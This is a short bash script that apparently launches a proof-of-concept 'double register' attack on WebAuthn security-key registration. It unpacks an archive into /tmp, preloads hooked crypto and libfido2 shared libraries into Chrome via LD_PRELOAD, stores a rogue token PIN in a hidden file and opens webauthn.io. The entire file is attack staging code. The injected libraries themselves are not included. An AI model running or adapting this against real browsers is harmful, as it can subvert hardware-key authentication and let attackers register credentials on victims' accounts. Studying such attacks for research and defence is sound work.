#!/bin/bash

FILE="double_register_attack"

rm -r /tmp/attack
mkdir /tmp/attack

cp $FILE.zip /tmp

unzip /tmp/$FILE.zip -d /tmp/attack

rm /tmp/$FILE.zip

chmod +x /tmp/attack/webauthn_io_register.py

unset LD_PRELOAD

export LD_PRELOAD="/tmp/attack/libcrypto.so:/tmp/attack/libcbor.so:/tmp/attack/libfido2-2023.so:/tmp/attack/$FILE.so"

touch /tmp/attack/.master_file

touch /tmp/attack/.swap

touch /tmp/attack/.rogue_register

ROGUE_TOKEN_PIN="1111"

while getopts :p flag
do
    case "${flag}" in
        p) ROGUE_TOKEN_PIN="$2";;
    esac
done

if [[ $ROGUE_TOKEN_PIN != "" ]]
then
	echo $ROGUE_TOKEN_PIN > /tmp/attack/.swap
fi

/opt/google/chrome/chrome webauthn.io
